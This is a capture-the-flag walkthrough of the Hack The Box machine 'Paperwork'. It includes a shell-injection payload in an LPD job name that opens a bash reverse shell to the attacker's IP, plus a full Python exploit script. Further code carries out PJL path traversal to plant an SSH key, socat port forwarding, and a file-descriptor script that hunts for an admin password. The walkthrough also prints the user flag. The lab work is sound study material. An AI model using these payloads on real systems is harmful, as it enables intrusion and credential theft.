
# #HTB 


![[Pasted image 20260814120827.png|281]]


# HTB: Paperwork

**Machine IP:** `10.129.248.117`  
**Difficulty:** Easy  
**OS:** Linux

---

## Tools Used
- `nmap` - Port discovery
- `python3` - Exploit development
- `nc` (netcat) - Reverse shells
- `ssh` - Remote access
- `socat` - Port forwarding
- `systemctl` - Service enumeration    

---

## Step 1: Reconnaissance - Port Scanning

### Why We Start with Nmap

The first step in any penetration test is reconnaissance. We need to understand what services are running on the target machine, what ports are open, and what versions of software are being used. This information helps us identify potential vulnerabilities.

### Nmap Command Explained

```bash
nmap -n -Pn -sC -sV 10.129.248.117
```


![[Pasted image 20260813131442.png]]


**Flag Breakdown:**
- `-n`: Skip DNS resolution (faster scanning)
- `-Pn`: Treat host as online (skip ping check)
- `-sV`: Version detection - identifies service versions
- `-sC`: Run default scripts - basic vulnerability checks

### Nmap Results Analysis

**Open ports discovered:**
- **Port 22 (SSH)** - OpenSSH 10.0p2 Ubuntu
    - This is the Secure Shell service for remote administration
    - Version 10.0p2 is relatively recent, likely no critical public exploits
- **Port 80 (HTTP)** - nginx 1.28.0 (Ubuntu)
    - The main web server running on HTTP
    - Redirects to `http://paperwork.htb/`
    - This tells us we need to add this domain to our hosts file        

### Hosts File Configuration

```bash
echo "10.129.248.117 paperwork.htb" | sudo tee -a /etc/hosts
```

**Why This Matters:** The web server uses virtual host configuration. If we access the IP directly, the server won't know which website to serve. By adding `paperwork.htb` to our hosts file, we ensure our browser and tools can resolve the domain correctly.


---

## Step 2: Web Enumeration - Source Code Discovery

### Website Overview

Visiting `http://paperwork.htb` reveals an "Intranet - Document Archiving Service" page.

**What We See:**
- A maintenance banner mentioning "Backend spooler PRN-ARCHIVE-01 management console is currently offline"
- A download link for `paperwork-archive-v1.02.zip`
- Information about the LPD protocol (RFC 1179)
- A target queue named `archive_intake`

**Key Discovery:** The download link contains the source code for the LPD server!

![[Pasted image 20260813131459.png]]

```bash
wget http://paperwork.htb/download/archive -O paperwork-archive-v1.02.zip
unzip paperwork-archive-v1.02.zip
```

**Why This Matters:** Source code is gold in penetration testing. It allows us to:
- Understand exactly how the application works
- Identify vulnerabilities that aren't visible from the outside
- Craft precise exploits

---

## Step 3: Source Code Analysis - Finding the Vulnerability

### Examining server.py

After extracting the archive, we find `server.py` in the LPDServer directory. Let's analyze the critical code:

```python
def handle_print_job(self, data):
    queue = data[1:].decode().strip()
    if queue not in VALID_QUEUE:
        ...
        return
    ...
    while True:
        chunk = self.sock.recv(1024)
        ...
        parts = chunk[1:].decode(errors='ignore').split()
        size = int(parts[0])
        content = b""
        while len(content) < size:
            content += self.sock.recv(size - len(content) + 1)
        decoded_content = content.decode(errors='ignore')

        job_name = "Unknown"
        for line in decoded_content.split('\n'):
            line = line.strip()
            if line.startswith('J'):
                job_name = line[1:]
                break

        subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

### Understanding the Vulnerability

**The Problem:** The `job_name` variable comes directly from attacker-controlled data (a line starting with 'J' in the control file) and is inserted into an f-string that gets executed with `shell=True`.

**Why This is Dangerous:**
1. `shell=True` means the command is passed to `/bin/sh`
2. We control the `job_name` content
3. A single quote (`'`) can break out of the echo command
4. We can inject our own commands

**Our Attack Payload:**
```
x'; bash -c 'bash -i >& /dev/tcp/10.10.14.163/44412 0>&1'; echo '
```

**How This Works:**
1. `x'` - Closes the quote and completes the first part of the echo
2. `;` - Ends the first command
3. `bash -c 'bash -i >& /dev/tcp/10.10.14.163/44412 0>&1'` - Our reverse shell
4. `;` - Ends our command
5. `echo '` - Reopens the quote so the rest of the original command is valid    



---

## Step 4: Exploiting LPD - Getting Shell as lp

### Understanding the LPD Protocol

The LPD (Line Printer Daemon) protocol is documented in RFC 1179. We only need to send a few commands:

**LPD Protocol Steps:**
1. Send command `\x02` followed by the queue name - This starts a print job
2. Send a control file header with the file size
3. Send the actual control file content containing our payload

### Exploit Script

```python
#!/usr/bin/env python3
import socket

TARGET = "10.129.248.117"
PORT = 1515
LHOST = "10.10.14.163"
LPORT = 44412

payload = f"x'; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'; echo '"
cfile = f"J{payload}\nHhost\nPuser\n".encode()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))

s.send(b'\x02archive_intake\n')
print(s.recv(1024))  # Expect \x00

s.send(b'\x02' + f"{len(cfile)} cfA001host\n".encode())
print(s.recv(1024))  # Expect \x00

s.send(cfile)
print(s.recv(4096))  # Expect \x00

s.close()
```

### Setting Up the Listener

Before running the exploit, we need to start a listener:
```bash
nc -lvnp 44412
```
**Flags Explained:**
- `-l`: Listen mode
- `-v`: Verbose output
- `-n`: No DNS resolution
- `-p 44412`: Listen on port 44412

### Executing the Exploit
```bash
python3 exploit.py
```


![[Pasted image 20260813131517.png]]

**What Happens:**
1. Our script connects to port 1515
2. Sends the LPD commands with our payload
3. The server executes our reverse shell
4. We get a connection on our listener

**Result:**
```bash
connect to [10.10.14.163] from [10.129.248.117] 44714
lp@paperwork:/opt/LPDServer$ id
uid=7(lp) gid=7(lp) groups=7(lp)
```


![[Pasted image 20260813131529.png]]

### Shell Upgrade
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


![[Pasted image 20260813131541.png]]


**Why This Matters:** The initial shell is limited. This gives us a proper interactive terminal.


---

## Step 5: Enumeration as lp - Discovering Services

### Checking System Services
```bash
systemctl list-units --type=service --all | grep -E 'lpd|jetdirect|paperwork|corposite'
```

**Services Found:**
- `lpdserver.service` - Our foothold (lp user)
- `jetdirect.service` - Runs as `archivist` user
- `paperwork.service` - Runs as `root`
- `corposite.service` - Runs as `root`

### Examining jetdirect.service
```bash
systemctl cat jetdirect.service
```

**Output:**
```
# /etc/systemd/system/jetdirect.service
[Unit]
Description=jetdirect server

[Service]
Type=simple
User=archivist                    #  Important!
WorkingDirectory=/home/archivist/printer/
ExecStart=/usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

**Why This Matters:**
- This service runs as the `archivist` user
- We need to become `archivist` to access the management socket
- The service is only listening on localhost (127.0.0.1:9100)

### Checking the Socket
```bash
ss -lntp | grep 9100
```

**Output:**
```
LISTEN 0 100 127.0.0.1:9100 0.0.0.0:*
```

**What This Means:**
- The service only accepts connections from localhost
- We need to forward the port to access it externally    
- We can use `socat` for this



---

## Step 6: Port Forwarding - Accessing JetDirect

### Understanding Port Forwarding

Port forwarding allows us to make a service that's only available locally accessible from the outside. In this case, jetdirect is listening on 127.0.0.1:9100, but we want to access it from our machine.

### Using socat
```bash
socat TCP-LISTEN:9999,fork TCP:127.0.0.1:9100 &
```

**What This Does:**
- `TCP-LISTEN:9999` - Listens on port 9999 on all interfaces
- `fork` - Handles multiple connections
- `TCP:127.0.0.1:9100` - Forwards connections to localhost:9100

**Result:** We can now access the JetDirect service from our machine on port 9999.

### Verifying the Service
```bash
nc -nv 10.129.248.117 9999
@PJL INFO ID
```

**Response:**
![[Pasted image 20260813134706.png]]

**What This Tells Us:** The service is a fake HP JetDirect printer that responds to PJL (Printer Job Language) commands.


---

## Step 7: Downloading jetdirect.py - Source Code Discovery

### Finding the File Size

First, we need to get a directory listing to find the file size:
```python
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.129.248.117', 9999))
s.send(b'@PJL FSDIRLIST NAME=\"0:\" ENTRY=1 COUNT=100\r\n')
data = s.recv(4096)
print(data.decode('utf-8', errors='ignore'))
s.close()
"
```

**Output:**
![[Pasted image 20260813134649.png]]
### Downloading the Source Code
```python
#!/usr/bin/env python3
import socket

def download_file(path, size):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(30)
    s.connect(("10.129.248.117", 9999))
    
    command = f'@PJL FSUPLOAD NAME="{path}" OFFSET=0 SIZE={size}\r\n'
    s.send(command.encode())
    
    data = b""
    while len(data) < size:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
        
    s.close()
    return data

print("[+] Downloading jetdirect.py...")
data = download_file("0:\\jetdirect.py", 5119)

if data:
    with open("jetdirect.py", "wb") as f:
        f.write(data)
    print(f"[+] Downloaded {len(data)} bytes successfully!")
```



---

## Step 8: Source Code Analysis - Path Traversal Vulnerability

### Examining jetdirect.py

The critical vulnerable code is in the Filesystem class:
```
class Filesystem:
    def __init__(self, root_dir):
        self._root = os.path.abspath(root_dir)          # /home/archivist/printer

    def _translate(self, path):
        clean = path.replace("0:", "").replace("\\", "/").lstrip("/")
        return os.path.normpath(os.path.join(self._root, clean))

    def write(self, path, data):
        target = self._translate(path)
        os.makedirs(os.path.dirname(target), exist_ok=True)
        with open(target, "wb") as f:
            f.write(data)
        return "OK"
```

### Understanding the Vulnerability

**The Problem:** The `_translate` method strips the `"0:"` volume label and converts backslashes, but it doesn't check if the final path is still within `self._root`.

**How Path Traversal Works:**
```
Root Directory: /home/archivist/printer/

Our Input: 0:\..\..\..\home\archivist\.ssh\authorized_keys

Step 1: Strip "0:" → \..\..\..\home\archivist\.ssh\authorized_keys
Step 2: Convert backslashes → /../../../home/archivist/.ssh/authorized_keys
Step 3: Strip leading slash → ../../../home/archivist/.ssh/authorized_keys
Step 4: Join with root → /home/archivist/printer/../../../home/archivist/.ssh/authorized_keys
Step 5: Normalize → /home/archivist/.ssh/authorized_keys

Result: We can write to any file in the system!
```



---

## Step 9: Path Traversal Exploitation - Becoming archivist

### Creating SSH Key Pair
```bash
ssh-keygen -t rsa -b 4096 -f archivist_key
```


![[Pasted image 20260813134638.png]]

**What This Does:**
- Creates a new RSA key pair
- Private key saved as `archivist_key`
- Public key saved as `archivist_key.pub`

### Uploading the Public Key
```python
#!/usr/bin/env python3
import socket

# Your public key from archivist_key.pub
PUBKEY = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC..."

def upload_file(path, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(30)
    s.connect(("10.129.248.117", 9999))
    
    command = f'@PJL FSDOWNLOAD NAME="{path}" SIZE={len(content)}\r\n'
    s.send(command.encode() + content.encode())
    
    response = s.recv(1024)
    s.close()
    return response

# Path Traversal to write the SSH key
path = r'0:\..\..\..\home\archivist\.ssh\authorized_keys'
print(f"[+] Uploading public key to: {path}")

response = upload_file(path, PUBKEY)
print(f"[+] Response: {response}")
```

**What This Does:**
1. Uses the path traversal vulnerability
2. Writes our public key to `/home/archivist/.ssh/authorized_keys`
3. This allows us to SSH in as the `archivist` user


![[Pasted image 20260813134558.png]]


### SSH Access as archivist
```bash
chmod 600 archivist_key
ssh -i archivist_key archivist@paperwork.htb
```

**Result:**
```
archivist@paperwork:~$ whoami
archivist
archivist@paperwork:~$ cat user.txt
435547ef3d12dd06d06f92bd76dc46bd
```


![[Pasted image 20260813134543.png]]




![[Pasted image 20260813185916.png]]


```python
#!/usr/bin/env python3
import socket
import array
import os

def main():
    try:
        print("[+] Connecting to management socket...")
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.connect("/run/paperwork/mgmt.sock")
        print("[+] Connected successfully!")
        
        print("[+] Receiving file descriptors...")
        msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_LEN(2 * 4))
        print(f"[+] Message: {msg}")
        
        fds = array.array('i')
        for level, type_, data in ancdata:
            if level == socket.SOL_SOCKET and type_ == socket.SCM_RIGHTS:
                fds.frombytes(data[:len(data) - (len(data) % fds.itemsize)])
        
        if not fds:
            print("[-] No file descriptors received!")
            return
            
        print(f"[+] Received {len(fds)} file descriptors: {list(fds)}")
        
        for fd in fds:
            try:
                content = os.pread(fd, 4096, 0)
                decoded = content.decode('utf-8', errors='ignore')
                
                print(f"\n[+] File Descriptor {fd} Content:")
                print("=" * 60)
                print(decoded)
                print("=" * 60)
                
                if "ADMIN_PASSWORD" in decoded:
                    for line in decoded.split('\n'):
                        if "ADMIN_PASSWORD" in line:
                            password = line.split('=')[1].strip()
                            print(f"\n[!] 🔑 PASSWORD FOUND: {password}")
                            print("[!] Save this password for root SSH login!")
                            
            except Exception as e:
                print(f"[-] Error reading fd {fd}: {e}")
        
        s.close()
        print("\n[+] Exploit completed!")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
```



![[Pasted image 20260813185936.png]]



![[Pasted image 20260813190049.png]]



![[Pasted image 20260813190104.png]]



![[Pasted image 20260813190142.png]]


